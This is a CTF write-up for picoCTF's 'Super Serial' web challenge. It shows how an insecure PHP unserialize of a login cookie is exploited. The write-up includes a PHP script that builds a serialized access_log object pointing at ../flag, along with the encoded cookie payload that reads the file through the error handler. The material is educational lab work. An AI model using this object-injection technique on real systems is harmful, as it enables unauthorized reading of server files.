---
title: Super Serial - PicoCTF Writeup
category: writeups
---

# Super Serial

*This is a writeup for the 'Super Serial' challenge in the Web Exploitation category*

## Description

---

![Untitled](/assets/Super Serial/Untitled.png)

## Approach

---

Upon visiting the link we are prompted with a sign in page

![Untitled](/assets/Super Serial/Untitled%201.png)

By inspecting the source we don’t find anything interesting, so lets try to look up the robots.txt file

![Untitled](/assets/Super Serial/Untitled%202.png)

we find that /admin.phps is not allowed to be indexed, so let’s try to access it

![Untitled](/assets/Super Serial/Untitled%203.png)

The file is not on the server, so let’s try to access the /index.phps file instead

By inspecting the page source we find this bit of code:

![Untitled](/assets/Super Serial/Untitled%204.png)

we notice that a new ***********permissions*********** object is created with the values fetched from the sign in form input fields, this object is then serialized, base_64 encoded and url encoded and then set a cookie by the name of “login”

we also notice a reference to the files “cookie.php” in line 2 and “authentication.php” in line 11

let’s request the source code for both by looking up the “cookie.phps” and “authentication.phps” files and inspecting them

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>

<!DOCTYPE html>
<html>
<head>
<link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
<link href="style.css" rel="stylesheet">
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</head>
	<body>
		<div class="container">
			<div class="row">
				<div class="col-sm-9 col-md-7 col-lg-5 mx-auto">
					<div class="card card-signin my-5">
						<div class="card-body">
							<h5 class="card-title text-center"><?php echo $msg; ?></h5>
							<form action="index.php" method="get">
								<button class="btn btn-lg btn-primary btn-block text-uppercase" type="submit" onclick="document.cookie='user_info=; expires=Thu, 01 Jan 1970 00:00:18 GMT; domain=; path=/;'">Go back to login</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>
```

we see a class **********access_log********** is defined

we immediately notice that the function __toString() returns the contents of the file in the $log_file field by calling read_log()

```php
	function __toString() {
		return $this->read_log();
	}
```

```php
function read_log() {
		return file_get_contents($this->log_file);
	}
```

let’s move on to “cookie.phps”

here the ***********permissions*********** class is defined

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

        function is_admin() {
                $admin = false;

                $con = new SQLite3("../users.db");
                $username = $this->username;
                $password = $this->password;
                $stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
                $stm->bindValue(1, $username, SQLITE3_TEXT);
                $stm->bindValue(2, $password, SQLITE3_TEXT);
                $res = $stm->execute();
                $rest = $res->fetchArray();
                if($rest["username"]) {
                        if ($rest["admin"] == 1) {
                                $admin = true;
                        }
                }
                return $admin;
        }
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}

?>
```

we notice that the catch clause at the end outputs “Deserialization error” and the output of the call of _toString() on $perm

if perm is a permissions object then the _toString() will return username and password, however if it is and access_log object it will print the contents of the log_file, since the _toString() of the access_log class will be called instead

in order to make an access_log object enter that catch block we can url encode it, serialize it, base_64 encode it and set it as the value of a cookie named “login”

When the cookie will be detected, the try block will start running but when PHP tries to call is_guest() on $perm, it will throw an error since $perm is an object of type access_log and not permissions, hence it does not have a definition for the functions is_guest() and is_admin()

The error will be caught and the contents of the log_file will be printed

Now we refer back to the hint:

![Untitled](/assets/Super Serial/Untitled%205.png)

if the flag is at ../flag then we just need to create an access_log object with the log_file field containing the path to ../flag

Then we serialize it, base64 encode it and url encode it

```php
<?php
class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

echo(urlencode(base64_encode(serialize((new access_log("../flag"))))));
?>
```

The output of the program:

```php
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

Now we create a cookie “login” with our object as value on the /authentication.php page

![Untitled](/assets/Super Serial/Untitled%206.png)

![Untitled](/assets/Super Serial/Untitled%207.png)

Refreshing the page gives us the flag.

![Untitled](/assets/Super Serial/Untitled%208.png)